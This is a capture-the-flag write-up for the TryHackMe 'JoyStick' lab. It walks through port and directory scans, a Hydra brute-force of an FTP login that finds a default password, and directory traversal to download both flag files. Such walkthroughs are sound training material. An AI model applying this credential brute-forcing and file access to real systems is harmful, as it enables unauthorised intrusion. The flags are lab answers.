# JoyStick

```
export IP=10.10.122.11
```

## Task 1 - Root It!

### 1 User Flag
Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ nmap -sC -sV -Pn -n $IP -oN nmap/initial
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 00:40 MDT
Nmap scan report for 10.10.122.11
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)
|   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)
|_  256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.44 seconds
```

Initial gobuster scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.122.11
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/25 00:40:22 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/25 00:41:45 Finished
===============================================================
```

At first, going to the website we see a short note that JoyStick is going to be a minecraft server, but isn't publicly available just yet:


![minecraft](https://user-images.githubusercontent.com/32188816/82785985-e832b200-9e20-11ea-93dc-f27223a16544.png)

Viewing the HTML source we also find a comment with some potentially useful details:


![ftp_server_note](https://user-images.githubusercontent.com/32188816/82786084-26c86c80-9e21-11ea-9c79-9e1d9fdcde07.png)

So far we have just a couple of notes:
  * Username is `steve`
  * FTP server is dysfunctional
  * There is an IRC service
  * Something is using a default password (presumably steve's account for FTP, IRC, or SSH?)

We can see from the nmap scan that we got a 500 error, lets try to connect to FTP and see what the error is:

```bash
500 "OOPS: vsftpd: refusing to run with writable root inside chroot()"
```

We know a couple things about this error from doing some basic research on it:
  * The home directory (which is the root of the FTP subdirectories) of the user we are connecting as is write-enabled
  * This is often the case when sharing SSH and FTP users
  * We can write to the FTP subdirectories, but we can also write to the parent directories, so vsftpd is complaining and giving a 500

So, we can assume that the FTP username is `steve`, and that the password is insecure because steve still hasn't changed it. We cannot use the Anonymous login because of the 500 error code, but we can run hydra to see if we can get in as steve. Doing so seems promising:

```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ hydra -l steve -P /usr/share/wordlists/rockyou.txt ftp://$IP
[STATUS] 118.05 tries/min, 2422 tries in 00:20h, 14341977 to do in 2024:51h, 16 active

[21][ftp] host: 10.10.122.11   login: steve   password: changeme
```

**Note:** Like we discussed earlier in the reasons for the FTP 500 error code, we know that these credentials are also steve's SSH creds, and we could just as easily SSH to the device and navigate through that.

Once we log in as steve we have a lot of files, as we are placed directly into steve's home directory due to the error discussed earlier:

```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ ftp -n $IP
Connected to 10.10.122.11.
220 (vsFTPd 3.0.3)
ftp> user
(username) steve
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/steve" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Desktop
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Documents
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Downloads
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Music
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Pictures
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Public
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 SteveStuff
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Templates
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Videos
-rw-r--r--    1 ftp      ftp          8980 May 03  2019 examples.desktop
-rw-rw-r--    1 ftp      ftp        589485 May 03  2019 snes.png
-rw-r--r--    1 ftp      ftp            19 May 03  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (19 bytes).
226 Transfer complete.
19 bytes received in 0.00 secs (421.6974 kB/s)
ftp>
```

Now that we have the `user.txt` file we can retrieve our user flag:

```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ cat user.txt
flag{is_only_gaem}
```

### 2 Root Flag

Since we know that this FTP server configuration is flawed, our FTP session is nearly an SSH session since we can write to the parent FTP directory. That said, we can navigate around and look at some other locations on the box. Doing so we see that there are two other directories in `/home`:

```bash
ftp> pwd
257 "/home/steve" is the current directory
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 04  2019 minecraft
drwxr-xr-x   18 ftp      ftp          4096 May 04  2019 notch
drwxr-xr-x   17 ftp      ftp          4096 May 04  2019 steve
226 Directory send OK.
```

Taking a look in the `/home/notch` directory shows that there is a file named `root.txt`:

```bash
ftp> cd notch
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Desktop
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Documents
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Downloads
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Music
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Pictures
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Public
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Templates
drwxr-xr-x    2 ftp      ftp          4096 May 03  2019 Videos
-rw-rw-r--    1 ftp      ftp        142136 May 03  2019 creeper-minimalist.jpg
-rw-rw-r--    1 ftp      ftp           181 May 04  2019 eula.txt
-rw-r--r--    1 ftp      ftp          8980 May 03  2019 examples.desktop
drwxrwxr-x    2 ftp      ftp          4096 May 04  2019 logs
-rw-rw-r--    1 ftp      ftp            36 May 03  2019 root.txt
-rw-rw-r--    1 ftp      ftp            59 May 04  2019 server.properties
226 Directory send OK.
```

So, let's see if we can read that file as the steve user and pull it down:

```bash
ftp> get root.txt
local: root.txt remote: root.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.txt (36 bytes).
226 Transfer complete.
36 bytes received in 0.00 secs (1004.4642 kB/s)
ftp>
```

Sweet, looks like we were able to get the file which means it must have had read permissions for at least steve, and now we have the root flag:
```bash
jeffrowell@kali:~/Documents/TryHackMe/JoyStick$ cat root.txt
flag{poorly_configured_permissions}
```
